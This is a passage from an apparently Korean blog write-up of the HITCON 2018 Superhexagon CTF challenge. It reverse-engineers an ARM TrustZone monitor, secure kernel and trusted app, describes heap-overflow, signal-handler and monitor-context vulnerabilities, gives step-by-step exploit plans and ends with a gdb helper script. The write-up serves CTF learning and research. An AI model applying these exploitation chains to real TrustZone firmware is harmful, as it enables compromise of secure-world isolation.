    ...
  }
  else {
    uVar1 = uVar1 & 0xffffffff;
                    /* save non-secure system register */
    save_el1_sysregs(1);
    if (x0 == 0x83000001) {
    ...
    FUN_00000b2c(0,tmp.PC + 0x20,0x1d3);
    restore_sysregs(0);
    set_spelx(0);
    ...
  }
```
이제 호출되었을 때 어디로 가는지 확인해야할 필요가 있다.
#### SPSR_EL3 structure & gdbscript
AArch64 exception이 발생했을 때 M bit 인코딩과 arm32에 대한 M bit 인코딩을 메뉴얼에서 확인했고 명령어 지원을 추가했다.
![[/blog/Hitcon_2018_Superhexagon/393b2f37044c13b66e317cece00e6432.png]]
#### bootloader
![[/blog/Hitcon_2018_Superhexagon/7142ee940bd610810b4ad8a86cf63896.png]]
S-EL1을 보다가 못 읽겠어서 aarch32 manual을 찾아서 차근차근 읽어봤다.
그랬더니 이미 정의된 주소로 핸들링을 수행한다고 한다.
Secure VBAR을 확인해야한다.
aarch64와 다르게 시스템 레지스터에 접근한다.
![[/blog/Hitcon_2018_Superhexagon/82485996e995a7ee5ff25c63f3bb027e.png]]
읽는 법은 위처럼 읽으면 된다.
  
VBAR 인자가 뭔지 잘 모르겠다.
그래서 부트로더로 다시 돌아가서 secure world가 어떻게 초기화되는지 분석했다.
kernel의 첫 페이지는 IPA 0x0에 매핑되어있다.
그래서 실질적으로 rebase해서 EL1을 분석할 때는 초기 페이지들을 날리고 했어야했다.
어쨋든 FUN_ffffffffc0008210에서 TEE OS initialize를 한다.
```C
...
    normal_ctx._536_4_ = 1;
    FUN_00000120(0xe000000,1,DAT_0e000008,0xe400000,1,2,(uVar2 & 0xffffffff) * 0x220 + 0xe002430);
  }
  return !bVar1;
}
```
0xe000000가 보이는거 보니 boot argument 같은 것으로 보인다.
BL1에서 0x68 만큼 copy한 데이터에 속한다.
![[/blog/Hitcon_2018_Superhexagon/ece4fe83cb4391c6e24019fb2914e1ad.png]]
```C
...
  (secure_context->sysregs).SCTLR_EL1 = (ulong)((*(uint *)(param_2 + 4) & 2) << 0x18 | uVar1);
  lVar2 = actlr_el1;
  (secure_context->sysregs).ACTLR_EL1 = lVar2;
  if (ns == 0) {
    (secure_context->sysregs).PMCR_EL0 = 0x60;
  }
                    /* SCR_EL3.NS = 0 */
  secure_context->scr_el3 = (ulong)new_SCR;
  secure_context->pc = *(uint64_t *)(param_2 + 8);
  secure_context->spsr = (ulong)*(uint *)(param_2 + 0x10);
  ...
```
위와 같이 secure context를 세팅한다.
```C
void FUN_000001f8(long param_1)
{
  restore_sysregs(0);
  set_spelx(0);
  FUN_00000c90(param_1 + 0x10);
  return;
}
```
FUN_00000c90 내부적으로 시스템 레지스터 세팅하고 eret한다.
어떤식으로 world switch가 일어나고 어디를 분석해야할지 알게 되었다.
#### Secure world pagewalk gdbscript
qemu에서 system registers를 보여주는데 오류가 있어서 직접 pagewalk를 하는 명령어 지원을 추가했다.
메뉴얼은 적당히 보고 넘기면서 구현했다.
AP\[2:1\] 모델이 조금 달라서 그부분도 신경쓰면서 구현했다.
```C
...
  lvl1_idx = addr >> 21 & 0x7f;
  if ((*(uint *)(&trans_table_lvl1 + lvl1_idx * 8) | *(uint *)(lvl1_idx * 8 + 0x8004004)) == 0) {
    uVar1 = FUN_0800019c(&trans_table_lvl2 + lvl1_idx * 0x1000);
    *(uint *)(&trans_table_lvl1 + lvl1_idx * 8) = uVar1 | 3;
    FUN_08001944(&trans_table_lvl2 + lvl1_idx * 0x1000,0,0x1000);
  }
  iVar2 = ((addr >> 0xc & 0x1ff) + lvl1_idx * 0x200) * 8;
  *(uint *)(&trans_table_lvl2 + iVar2) = local_30 | phys_addr;
  *(uint *)(iVar2 + 0x8005004) = uStack_2c;
...
```
읽었던 메뉴얼이랑 세부 사항이 다른 것같아서 리버싱한 결과대로 구현했다.
빠르게 구현하는데 초점을 맞춰서 구현이 제대로 되었는지는 잘 모르겠다.
기존에 미리 작성했던 secure world의 물리 메모리를 읽는 스크립트를 같이 활용해서 구현했다.
![[/blog/Hitcon_2018_Superhexagon/287c5219c962bb69887b5b29f0968ee8.png]]
Exception vector tables를 포함한 text 부분이 PL1에서도 Read-Only 인 것을 보니 구현이 틀리지는 않았을 것 같다.
### Reverse engineering S-EL1
VBAR은 0xe400000 이다.
```C
  ...
  coprocessor_moveto2(0xf,0,DAT_00001798 + (0x16a0 - DAT_000017a8),0,in_cr2);
  coprocessor_moveto2(0xf,1,0,0,in_cr2);
  coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2);
  coproc_moveto_Translation_table_control(0x80802504);
  coproc_moveto_Domain_Access_Control(DAT_000017ac);
  ...
```
이런 괴랄한 코드는 어떻게 읽는지 모르겠어서 메뉴얼을 다시 읽었다.
mcrr은 register 두 개를 쓰는거라 64-bit 시스템 레지스터에 쓴다고 한다.
![[/blog/Hitcon_2018_Superhexagon/187578c32676fc0cc406c5744eb9d855.png]]
이런식의 인코딩 차이가 있다.
드디어 CRm만 가지고 어떻게 표를 보는지 알게 되었다.

bios.bin을 FEFFFFEA로 패치해서 무한루프를 만들어서 원하는 곳을 디버깅할 수 있다.
Normal world에 대한 디버깅 능력을 상실했으니 무조건 secure world에서 멈춰야한다.

디버거가 시스템 레지스터를 제대로 표현하지 못한다.
```C
...  
                    /* TTBR0 */
  coprocessor_moveto2(0xf,0,DAT_0e401798 + (0xe4016a0 - DAT_0e4017a8),0,in_cr2);
                    /* TTBR1 */
  coprocessor_moveto2(0xf,1,0,0,in_cr2);
  coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2);
                    /* TTBCR */
  coproc_moveto_Translation_table_control(0x80802504);
                    /* DACR */
  coproc_moveto_Domain_Access_Control(DAT_0e4017ac);
                    /* VBAR */
  coprocessor_moveto(0xf,0,0,LONG_0e4017b0,in_cr12,in_cr0);
  uVar1 = coproc_movefrom_Control();
                    /* enable mmu */
  coproc_moveto_Control(uVar1 | 1);
...
```
천천히 보니 어떤 행동을 하고 있는지 알 것 같다.

생각보다 변환 단계가 그리 많지 않아서 직접 손으로 해도 충분하다.
VBAR는 VA 0x8000040 이지만, PA로 변환해보면 0xe400040이다.
cps로 다시 supervisor mode로 변경해서 마저 TEE os initialization을 수행한다.
이후 다시 VBAR을 정상적으로 세팅해준다.
```C
        0e401754 10  0f  01  ee    mcr        p15,0x0 ,r0,cr1 ,cr0 ,0x0
        0e401758 58  d0  9f  e5    ldr        sp,[DAT_0e4017b8 ]                               = 08087000h
        0e40175c 3f  fa  ff  fa    blx        FUN_0e400060                                     undefined FUN_0e400060()
        0e401760 13  00  02  f1    cps        #19
        0e401764 50  d0  9f  e5    ldr        sp,[DAT_0e4017bc ]                               = 08085000h
        0e401768 50  00  9f  e5    ldr        r0,[DAT_0e4017c0 ]                               = 10000000h
```
thumb로 모드를 변경한다.
```C
        08001780 3c  10  9f  e5    ldr        r1,[DAT_080017c4 ]                               = 08000000h
        08001784 02  00  00  e3    movw       r0,#0x2
        08001788 00  03  48  e3    movt       r0,#0x8300
        0800178c 70  00  60  e1    smc        0x0
```
그리고 다시 smc를 불러서 secure monitor로 돌아간다.
의사코드만 읽다가 위 어셈블리 스니펫을 놓쳤었는데, 이거 때문에 하루종일 삽질했다.
다시 secure monitor로 돌아가면 r1을 저장하며, TEE OS initialized 문구를 출력한다
EL0에서 TA_Bin을 secure world로 업로드했었는데, 거기를 처리하는 로직을 찾아야한다.
secure monitor 분석 결과를 기반으로 처리 로직은 vector_table + 0x20 를 따라가면 나온다는 것을알고 있다.
entry 부터 쭉 따라가다 보면 바로 원하는 로직을 발견할 수 있다.
여기서 업로드 로직을 확인해야 secure world에서 동작하는 user binary가 어떻게 동작하는지 알 수 있다.

#### Reversing the binary loader & S-EL0 binary extraction
이후 커스텀 로더를 분석했고 바이너리 포맷을 알아냈다.
non-secure world에서 전달된 바이너리의 무결성은 sha256으로 검증된다.
```C
0x1000 0x1000 (0x684)
0x2000 0x1000 (0xa8)
0x100000 0x82000 (0x81070)
0xff8000 0x8000 (0x8000)
```
위와 같이 매핑된다.
권한은 직접 만든 secure world에서의 pagewalk 명령어로 확인할 수 있었다.
![[/blog/Hitcon_2018_Superhexagon/428e3bfa84595f217f4a7f64abce7d06.png]]
0x24만큼 헤더가 짤린 S-EL0.bin을 기드라에 로드해서 세그먼트 별로 잘라서 로드해주고 분석하면 된다.
## S-EL0, Secure application
```C
...
  interrupt_kernel(0xb,0x1001);
  if (tci_handle_arg->cmd == 2) {
                    /* load */
    FUN_0000104e(tci_handle_arg);
  }
  else if (tci_handle_arg->cmd == 3) {
                    /* store */
    FUN_000010f6(tci_handle_arg);
  }
...
```
내부적으로 store 로직에서 custom heap allocator를 이용한다.
### Vulnerability
```c
uint32_t * malloc(uint sz)
{
  ...
  if ((int)is_heap_initialized < 0) {
    FUN_000012c2();
  }
  cur_chunk = Arena.chunk_ptr;
                    /* size normalization */
  if (sz + 0x1f < 0x20) {
    size = 0x20;
  }
  else {
    size = sz + 0x1f & 0xfffffff0;
  }
  if (size < 0x40000) {
    for (iter_chunk = (Arena.freelist)->fd; iter_chunk != Arena.freelist;
        iter_chunk = iter_chunk->fd) {
      FD = iter_chunk->fd;
      BK = (freed_chunk *)iter_chunk->bk;
      cur_sz = iter_chunk->size & 0xfffffffc;
      if (size <= cur_sz) {
        BK->fd = FD;
        FD->bk = (uint32_t)BK;
        *(uint *)((int)&iter_chunk->size + cur_sz) = *(uint *)((int)&iter_chunk->size + cur_sz) | 1;
                    /* prev inuse bit set */
        return &iter_chunk->bk;
      }
    }
    cur_sz = (Arena.chunk_ptr)->sz & 0xfffffffc;
    if (size + 0x20 <= cur_sz) {
      next_chunk = (chunk *)((int)&(Arena.chunk_ptr)->fd_const0 + size);
      cur_sz_addr = &(Arena.chunk_ptr)->sz;
      Arena.chunk_ptr = next_chunk;
      *cur_sz_addr = size | 1;
      next_chunk->sz = cur_sz - size | 1;
      return &cur_chunk->payload;
    }
  }
  else {
    size = size + 0xfff & 0xfffff000;
    iVar1 = (chunk *)software_interrupt_2(0,size,0,0,0xffffffff,0);
    if (iVar1 != (chunk *)0xffffffff) {
      iVar1->sz = size | 2;
      return &iVar1->payload;
    }
  }
                    /* unlink */
  return (uint32_t *)0x0;
}
```
구조체를 복원하고 분석하다가 integer overflow를 발견했다.
취약점을 트리거하면 size가 너무 커지기에 무조건 SIGSEGV가 난다.
이후 abort exception handler로 진입한다.
```C
void FUN_00001000(undefined4 param_1)
{
  ...
  auStack_1c[0] = (undefined2)s_Secure_DB_access_failed_(SIGSEGV_00002000._32_4_;
  pTStack_18 = tci_handle;
  tci_handle->cmd = 1;
  uStack_44 = param_1;
  strcpy(pTVar1->data,&uStack_3c);
  uVar3 = 0x104f;
  puVar2 = (undefined4 *)FUN_0000166c(0);
  pcStack_54 = s_Secure_DB_access_failed_(SIGSEGV_00002000 + 0x20;
  ...
```
다시 원래 context로 복원하여 계속 실행되게 된다.
![[/blog/Hitcon_2018_Superhexagon/428e3bfa84595f217f4a7f64abce7d06.png]]
secure world에서의 pagewalk 결과를 보면, 매핑 자체가 PL0에서 RWX 임을 알 수 있다.
다음과 같은 malloc 내부 로직을 이용하여 4 bytes aaw를 달성한다.
```C
      ...
      FD = iter_chunk->fd;
      BK = (freed_chunk *)iter_chunk->bk;
      cur_sz = iter_chunk->size & 0xfffffffc;
      if (size <= cur_sz) {
        BK->fd = FD;
        FD->bk = (uint32_t)BK;
        *(uint *)((int)&iter_chunk->size + cur_sz) = *(uint *)((int)&iter_chunk->size + cur_sz) | 1;
                    /* prev inuse bit set */
        return &iter_chunk->bk;
      ...
```
Arena.chunk_ptr을 변조하면 S-EL0의 code segment에 대한 청크 할당이 가능해진다.
이를 이용해 S-EL0의 엔트리를 변조해서 임의 쉘코드 실행을 달성한다.
  
내부적으로 이미 할당된 청크에 대해서는 free이후 다시 할당해서 reclaim이 가능하다.
freelist에 역순으로 size 더 크게해서 chunk free하고 취약점을 트리거해서 메타데이터를 덮었다.
이후 Arena 구조체의 entry를 4 bytes aaw primitive를 이용해 덮고, freelist에 적합한 size를 초과한 크기를 할당하면 원하는 S-EL0의 .text 영역에 read/write가 가능해진다.
  
exploit 전략은 다음과 같다.
1) chunk 2 1 0 free.
2) chunk 0 reclaim → heap overflow.
3) chunk 1 할당, 0x100050 fd,bk 작성해서 freelist 순회 끊키 → unlink aaw Arena.chunk_ptr overwrite → .text.
4) size를 0x300 정도로 설정해서 next chunk에 write 연산 sigsegv 방지, 돌고 있는 memcpy 코드 수정 방지 & 할당된 청크에 쉘 코드 작성.
5) 시스템 레지스터를 읽고 world shared memory에 flag write하고 software interrupt 0를 발생시켜 normal world로 복귀해서 플래그 출력.
취약점 자체는 간단해서 금방 찾았는데 malloc 내부 로직에서 자꾸 꼬여서 익스가 힘들었다.
```c
[*] Paused (press any to continue)
[*] Switching to interactive mode
hitcon{this is flag 3 for EL2}
\x00hitcon{this is flag 4 for S-EL0}[*] Got EOF while reading in interactive
```
## S-EL1, Secure kernel
이제 S-EL1에서 Secure world의 물리 메모리까지 마음대로 수정할 수 있으면 S-EL3를 공격할 수 있다.
실질적으로 Secure world는 EL0&1 regime가 singe VA range 방식을 취하고 있기에 좀 더 구조적으로 취약하다.
S-EL1 자체는 S-EL0 뿐만 아니라 EL2에서도 간접적으로 상호 작용이 가능해 공격 벡터가 될 수 있다.
### Vulnerability 1 - Permission bug
Secure physical address에 대한 접근은 제한된다.
그런데 약간의 문제가 발생할 여지가 있다.
![[/blog/Hitcon_2018_Superhexagon/58268e73ab9f35acad3edec6b89b7666.png]]
권한 설정에 문제가 있다.
```C
  ...
    uVar2 = va >> 0x15 & 0x7f;
    uVar3 = va >> 0xc & 0x1ff;
    iVar1 = uVar2 * 8;
    if ((*(uint *)(&trans_table_lvl1 + iVar1) | *(uint *)(iVar1 + 0x8004004)) == 0) {
      local_c = (uVar3 + 1) * 0x1000;
    }
    else {
      iVar1 = (uVar3 + uVar2 * 0x200) * 8;
      if ((*(uint *)(&trans_table_lvl2 + iVar1) | *(uint *)(iVar1 + 0x8005004)) != 0) {
...
```
trans_table_lvl2에 0x200 * 8 을 더해서 접근하는 이유는 lvl2 page table이 연속적이기 때문이었다.
```C
undefined4 FUN_080003da(int param_1,int phys,int sz,undefined4 prop)
{
  int iVar1;
  int size;
  int phys_addr;
  int VA;
  
  size = sz;
  phys_addr = phys;
  VA = param_1;
  while( true ) {
    if (size == 0) {
      return 0;
    }
    iVar1 = FUN_080001e8(VA,phys_addr,prop);
    if (iVar1 == -1) break;
    VA = VA + 0x1000;
    phys_addr = phys_addr + 0x1000;
    size = size + -0x1000;
  }
  return 0xffffffff;
}
```
분석한 결과를 토대로 FUN_0800054a은 그냥 할당되지 않은 VA를 리턴하는 함수라는 것을 알 수 있다.
FUN_080003da은 컨트롤 불가능한 Secure VA와 Non-secure PA와 size, 고정된 attribute 값을 인자로 받는다.

```C
+static const MemMapEntry memmap[] = {
+    /* Space up to 0x8000000 is reserved for a boot ROM */
+    [VIRT_FLASH] =              {          0, 0x08000000 },
+    [VIRT_CPUPERIPHS] =         { 0x08000000, 0x00020000 },
+    [VIRT_UART] =               { 0x09000000, 0x00001000 },
+    [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+    [VIRT_MEM] =                { 0x40000000, RAMLIMIT_BYTES },
+};
```
integer overflow 버그가 존재하지만 취약점으로 0x0 번지를 할당받아도 최대 사이즈 검증 때문에 절대 FLASH 영역을 벗어날 수 없어 의미가 없다.
write를 하더라도 qemu 에뮬레이터는 실제 환경과 동일하게 FLASH의 read only를 보장한다.
악용할 수 없는 취약점이다.
```C
undefined4 FUN_080001e8(uint addr,uint phys_addr,uint param_3)
{
  ...
  uVar3 = addr >> 0x15 & 0x7f;
  if ((*(uint *)(&trans_table_lvl1 + uVar3 * 8) | *(uint *)(uVar3 * 8 + 0x8004004)) == 0) {
    uVar1 = FUN_0800019c(&trans_table_lvl2 + uVar3 * 0x1000);
    *(uint *)(&trans_table_lvl1 + uVar3 * 8) = uVar1 | 3;
    FUN_08001944(&trans_table_lvl2 + uVar3 * 0x1000,0,0x1000);
  }
  iVar2 = ((addr >> 0xc & 0x1ff) + uVar3 * 0x200) * 8;
  *(uint *)(&trans_table_lvl2 + iVar2) = local_30 | phys_addr;
  *(uint *)(iVar2 + 0x8005004) = uStack_2c;
...
```
내부적으로 walk해서 다음과 같이 할당한다.
이때 넘어가는 물리 주소는 비트맵을 통해 관리되며 할당 해제된 상태에선 1로 마스킹된다.
```C
void FUN_080006ba(int phys)
{
  ...
  uVar1 = phys - secure_phys_max >> 17;
  if (uVar1 < 0x20) {
    v0[uVar1] = v0[uVar1] | 1 << (0x1f - (phys - secure_phys_max >> 12 & 0b00011111) & 0xff);
  }
  return;
}
```
2 진수로 보면 편한데, 내부적으로 Secure VA를 PA로 변환하고 0을 대입한다.
그리고 size 만큼 루프돌면서 위 함수를 호출하는데, 이는 v0에 일종의 bitmap 방식으로 freed memory를 마킹한다.
### Vulnerability 2 - file upload DOS
```C
...
  iVar1 = verify(param_1,param_2);
    ...
        FUN_08001944(*(undefined4 *)(param_1 + 0x14),0,iVar1);
        FUN_08001906(*(undefined4 *)(param_1 + 0x14),param_1 + iVar4 + 0x24,
                     *(undefined4 *)(param_1 + 0x18));
      }
      if (*(int *)(param_1 + 0x20) != 0) {
        FUN_08001944(*(undefined4 *)(param_1 + 0x1c),0,iVar2);
      }
      FUN_08001944(0xff8000,0,0x8000);
      Entry = *(dword *)(param_1 + 8);
      tci_handle = (TCI **)(*(int *)(param_1 + 0x20) + *(int *)(param_1 + 0x1c) + -4);
	...
```
업로드 코드의 일부이다.
다른 world이고 translation 방식도 다른데 secure world의 VA를 넘기는게 이상했다.
유효하지 않은 주소를 보내면 DOS가 가능하다.

system call interface도 공격 벡터가 될 수 있으니 다음 software interrupt handler를 분석해야한다.
```C
void FUN_08000a30(void)
{
  ...
  switch(from_text) {
  case 0:
    FUN_08000918(ctx.r0);
    break;
  case 1:
    local_10 = FUN_08000928(ctx.r0,ctx.r1);
    break;
  case 2:
    local_10 = FUN_08000964(ctx.r0,ctx.r1);
    break;
  case 3:
    local_10 = FUN_080009d6(ctx.r0,ctx.r1);
  }
  ctx.r0 = local_10;
  return;
```
case 0은 normal world로 복귀할 때 이용한다.
S-EL3에선 ctx.x0에 여기서 Secure application에서 넘긴 리턴 값을 Normal world로 옮긴다.
case 1은 signal handler를 할당한다.
### Vulnerability 3 - signal handler 
```c
undefined4 FUN_08000928(int r0,uint r1)
{
  if ((r1 < 0x2400000) && (r0 == 0xb)) {
    _signal_handler = r1;
  }
  return 0xffffffff;
}
```
이때 검증이 없어 world shared memory도 signal handler 등록이 가능하다.

FUN_08000964는 이용가능한 VA에 물리 주소를 매핑한다.
case 2, 3은 메모리 매핑 및 언매핑 함수다.
공통적으로 다음 로직이 구현된다.
```C
int FUN_080005ac(void)
{
  int iter;
  int local_c;
  
  local_c = -1;
  iter = 0;
  while ((iter < 0x20 && (local_c = FUN_080005a2(v0[iter]), local_c == 32))) {
    iter = iter + 1;
  }
  if (local_c == 0x20) {
    local_c = -1;
  }
  else {
    v0[iter] = v0[iter] & ~(1 << (0x1fU - local_c & 0xff));
    local_c = local_c + iter * 32;
  }
  return local_c;
}
```
Secure VA를 페이지 테이블에서 제거할 때 right shift 17을 했었다.
그냥 비트맵을 확인하고 물리메모리가 비었으면 그 부분을 리턴한다.
2^12랑 곱하면 특정 비트에 해당하는 주소를 계산할 수 있다는 것을 알 수 있다.
```C
int FUN_08000684(void)
{
  int iVar1;
  
  iVar1 = FUN_080005ac();
  if (iVar1 == -1) {
    iVar1 = -1;
  }
  else {
    iVar1 = iVar1 * 0x1000 + secure_phys_max;
  }
  return iVar1;
}
```
Secure physical memory에 더해가면서 할당한다.
S-EL1과 S-EL0는 Abort가 발생하면 똑같은 exception handler로 진입한다.
```c
        08001588 3c  e0  8d  e5    str        lr,[sp,#param_11 ]
        0800158c 00  e0  4f  e1    mrs        lr,spsr
        08001590 40  e0  8d  e5    str        lr,[sp,#param_12 ]
        08001594 13  00  02  f1    cps        #19
        08001598 8a  00  00  eb    bl         FUN_080017c8                                     undefined FUN_080017c8(undefined
        0800159c 44  80  9d  e5    ldr        r8,[sp,#param_13 ]
        080015a0 1f  00  02  f1    cps        #31
        080015a4 08  d0  a0  e1    cpy        sp,r8
        080015a8 17  00  a0  e3    mov        param_1 ,#0x17
        080015ac 6b  fd  ff  fb    blx        FUN_08000b62                                     undefined FUN_08000b62()
        080015b0 b1  00  00  ea    b          FUN_0800187c                                     undefined FUN_0800187c(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
spsr은 exception 발생시에 mode를 가리킨다.
```C
void FUN_08000ae0(void)
{
  if ((_signal_handler & 1) == 0) {
    ctx.cpsr = ctx.cpsr & 0b11111111111111111111111111011111;
  }
  else {
    ctx.cpsr = ctx.cpsr | 0b00100000;
  }
  ctx.pc = _signal_handler;
  ctx.r0._0_1_ = 0xb;
  ctx.r0._1_1_ = 0;
  ctx.r0._2_1_ = 0;
  ctx.r0._3_1_ = 0;
  return;
}
```
구조체를 복원했다.
```c
                             LAB_08001870                                    XREF[1]:     FUN_0800187c:08001888 (j)   
        08001870 e8  ff  ff  eb    bl         FUN_08001818                                     undefined FUN_08001818(undefined
        08001874 3c  e0  9d  e5    ldr        lr,[sp,#0x3c ]
        08001878 0e  f0  b0  e1    movs       pc,lr
```
movs pc, lr로 핸들러로 돌아간다.
이때 spsr에 대한 mode 체크가 없다는 취약점이 있다.
이 취약점을 악용하기 위해선 S-EL1에서 Access violation 관련 exception을 일으켜야 한다.
### Gaining code execution
총 세 가지 취약점을 체이닝하면 임의 코드 실행을 얻을 수 있다.
1. World shared memory mapping에 이용되는 메모리 권한 취약점.
2. Signal exception handler 구현 취약점.
3. Secure world user application upload에서 발생하는 DOS 취약점.
### Enhancing the exploitation stability
먼저 S-EL3까지 exploit 하기 위해선 shellcode를 넣을 공간이 필요했다.
기존 익스플로잇은 0x300 크기라서 그 이상가면 런타임에 memcpy가 덮히게 되고, qemu 3.0.0의 버그로 인해 디버깅이 아예 불가능하게 된다.
그래서 디버깅시엔 코드가 실행이 안되고, bp를 설정하지 않으면 코드가 실행이 된다.
결론적으로 불안정한 코드로 인해 발생한 버그라서 memcpy 보다 상위에 있는 코드 스니펫을 덮으려 시도했고, 성공적으로 덮었다.
```c
[*] Switching to interactive mode
hitcon{this is flag 3 for EL2}
\x00hitcon{this is flag 5 for S-EL1}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```
Exploit 시나리오 자체는 전과 비슷하다.
똑같이 secure에서 flag를 가져오고, 다시 Normal world로 복귀해서 flag를 출력한다.
## S-EL3, Secure monitor
```Python
        00000fa8 f1  03  00  91    mov        x17 ,sp
        00000fac bf  41  00  d5    msr        PState.SP,#0x1
        00000fb0 f1  8b  00  f9    str        x17 ,[sp, #param_11 ]
        00000fb4 f2  83  40  f9    ldr        x18 ,[sp, #SCR_EL3 ]
        00000fb8 f0  c7  51  a9    ldp        x16 ,x17 ,[sp, #SPSR_EL3 ]
        00000fbc 12  11  1e  d5    msr        scr_el3 ,x18
        00000fc0 10  40  1e  d5    msr        spsr_el3 ,x16
        00000fc4 31  40  1e  d5    msr        elr_el3 ,x17
        00000fc8 f5  ff  ff  17    b          FUN_00000f9c                                     undefined FUN_00000f9c(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
전에 분석했을 때는 전혀 취약점이 보이지 않았었다.
나중에 다시 보니 쉽게 구조적인 취약점을 발견할 수 있었다.
취약점 상세 내용은 다음과 같다.
### Vulnerability
S-EL3의 일부 rw가 필요한 영역은 RAM에 적재된다.
그런데 context switching 시에 보호해야 할 시스템 레지스터들이 RAM에 올라와있다.
이런 구조는 절대 격리가 유지될 수 있는 구조가 아니다.
이미 ram에 대한 모든 제어권을 가지고 있기에 그냥 바꾸기만 하면 된다.

생각해낸 익스플로잇 시나리오는 다음과 같다.
1. S-EL1 PTE 조작 → 쉘 코드 작성.
2. S-EL1 PTE 조작 → S-EL3 PTE 조작 → 쉘 코드 페이지 매핑.
3. S-EL1 PTE 조작 & tlb flush → ctx.pc, ctx.cpsr 변조.
4. Secure monitor call → ACE.
여기서 세 번째 스텝이 tlb flush 인데 이건 같은 VA를 다른 PA에 매핑하기 위해 연속적으로 같은 VA에 접근해서 tlb가 캐싱되므로 이를 flush 하기 위해서 이용했다.
qemu는 mmu를 프로세서와 완전 동일하게는 아니여도 범용적인 mmu를 softmmu라는 feature로 mmu 에뮬레이션을 지원하기에 꼭 필요한 스텝이다.
```c
static bool mmu_lookup1(CPUState *cpu, MMULookupPageData *data,
                        int mmu_idx, MMUAccessType access_type, uintptr_t ra)
{
    vaddr addr = data->addr;
    uintptr_t index = tlb_index(cpu, mmu_idx, addr);
    CPUTLBEntry *entry = tlb_entry(cpu, mmu_idx, addr);
    uint64_t tlb_addr = tlb_read_idx(entry, access_type);
    bool maybe_resized = false;
    CPUTLBEntryFull *full;
    int flags;
    /* If the TLB entry is for a different page, reload and try again.  */
    if (!tlb_hit(tlb_addr, addr)) {
        if (!victim_tlb_hit(cpu, mmu_idx, index, access_type,
                            addr & TARGET_PAGE_MASK)) {
            tlb_fill(cpu, addr, data->size, access_type, mmu_idx, ra);
            maybe_resized = true;
            index = tlb_index(cpu, mmu_idx, addr);
            entry = tlb_entry(cpu, mmu_idx, addr);
        }
        tlb_addr = tlb_read_idx(entry, access_type) & ~TLB_INVALID_MASK;
    }
    full = &cpu->neg.tlb.d[mmu_idx].fulltlb[index];
    flags = tlb_addr & (TLB_FLAGS_MASK & ~TLB_FORCE_SLOW);
    flags |= full->slow_flags[access_type];
    data->full = full;
    data->flags = flags;
    /* Compute haddr speculatively; depending on flags it might be invalid. */
    data->haddr = (void *)((uintptr_t)addr + entry->addend);
    return maybe_resized;
}
```
mmu_lookup1 함수에서 hit이면 그냥 저장된 인덱스에 맞춰서 바로 리턴하는 것을 확인할 수 있다.
![[/blog/Hitcon_2018_Superhexagon/230f82e498d4aa43cc1ed80c24ffd70d.png]]
쉘 코드 길이를 늘리기 위해선 그냥 여기서 fault 내고 더 낮은 exception vector offset으로 뛰면 0xd00 주변으로 뛸 수 있다.
그걸 이용해서 0xd00 주변에 쉘 코드를 배치한다.
```c
\x00hitcon{this is flag 6 for EL3}
\x00hitcon{this is flag 6 for EL3}
\x00hitcon{this is flag 6 for EL3}
\x00$ 
[*] Interrupted
hitcon{this is flag 6 for EL3}
```
# Appendix
## Gdbscript
```python
import gdb
import re
import psutil
import struct
class CPSR(gdb.Command):

    def __init__(self):
        super(CPSR, self).__init__("cpsr", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        cpsr = (int(gdb.parse_and_eval("$cpsr")))
        mode = cpsr & 0b1111
        is_thumb = (cpsr >> 4)&1
        state = (cpsr >> 4)&1
        IRQ = (cpsr >> 5)&1
        FIQ = (cpsr >> 6)&1
        cond = (cpsr >> 27)&0b1111

        re = ''
        if not state:
            if 0b0000 == mode:
                re += 'EL0t' # SP_EL0
            elif 0b0100 == mode:
                re += 'EL1t' # SP_EL0
            elif 0b0101 == mode:
                re += 'EL1h' # SP_EL1
            elif 0b1000 == mode:
                re += 'EL2t' # SP_EL0
            elif 0b1001 == mode:
                re += 'EL2h' # SP_EL2
            elif 0b1100 == mode:
                re += 'EL3t' # SP_EL0
            elif 0b1101 == mode:
                re += 'EL3h' # SP_EL3
            else:
                re += 'UNK'
        else:
            if 0b0000 == mode:
                re += 'User'
            elif 0b0001 == mode:
                re += 'FIQ'
            elif 0b0010 == mode:
                re += 'IRQ'
            elif 0b0011 == mode:
                re += 'Supervisor'
            elif 0b0110 == mode:
                re += 'Monitor'
            elif 0b0111 == mode:
                re += 'Abort' 
            elif 0b1010 == mode:
                re += 'Hyp' 
            elif 0b1011 == mode:
                re += 'Undefined' 
            elif 0b1111 == mode:
                re += 'System' 
            else:
                re += 'UNK'
        re += ' | '
        if IRQ:
            re += 'IRQ_MASKED | '
        elif FIQ:
            re += 'FIQ_MASKED | '
        if is_thumb:
            re += 'THUMB_MODE | '
        if state:
            re += '32-BIT | '
        else:
            re += '64-BIT | '
        re += f'COND_{hex(cond)[2:]}'
        print(re)

class SPSR_EL3(gdb.Command):

    def __init__(self):
        super(SPSR_EL3, self).__init__("spsr_el3", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        spsr = (int(gdb.parse_and_eval("$SPSR_EL3")))
        mode = spsr & 0b1111
        is_thumb = (spsr >> 4)&1
        IRQ = (spsr >> 7)&1
        FIQ = (spsr >> 6)&1
        cond = (spsr >> 27)&0b11111
        state = (spsr >> 4)&1
        re = ''
        if not state:
            if 0b0000 == mode:
                re += 'EL0t' # SP_EL0
            elif 0b0100 == mode:
                re += 'EL1t' # SP_EL0
            elif 0b0101 == mode:
                re += 'EL1h' # SP_EL1
            elif 0b1000 == mode:
                re += 'EL2t' # SP_EL0
            elif 0b1001 == mode:
                re += 'EL2h' # SP_EL2
            elif 0b1100 == mode:
                re += 'EL3t' # SP_EL0
            elif 0b1101 == mode:
                re += 'EL3h' # SP_EL3
            else:
                re += 'UNK'
        else:
            if 0b0000 == mode:
                re += 'User'
            elif 0b0001 == mode:
                re += 'FIQ'
            elif 0b0010 == mode:
                re += 'IRQ'
            elif 0b0011 == mode:
                re += 'Supervisor'
            elif 0b0110 == mode:
                re += 'Monitor'
            elif 0b0111 == mode:
                re += 'Abort' 
            elif 0b1010 == mode:
                re += 'Hyp' 
            elif 0b1011 == mode:
                re += 'Undefined' 
            elif 0b1111 == mode:
                re += 'System' 
            else:
                re += 'UNK'
        re += ' | '
        if IRQ:
